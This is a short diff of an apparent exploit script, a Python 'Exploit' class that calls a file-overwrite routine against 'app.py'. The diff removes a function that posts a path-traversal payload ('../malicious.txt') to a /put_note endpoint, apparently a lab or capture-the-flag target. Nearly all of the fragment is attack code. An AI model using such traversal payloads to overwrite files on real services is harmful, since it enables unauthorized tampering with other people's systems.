@@ -10,10 +10,5 @@ class Exploit():
         print("Response:", response.text)
         print("file overwritten")
 
-def exploit_write():
-    payload = {"name": "../malicious.txt", "value": "You got hacked!"}
-    response = requests.post(f"{URL}/put_note", json=payload)
-    print("Response:", response.json())
-
 
 Exploit.overwrite_file("app.py")
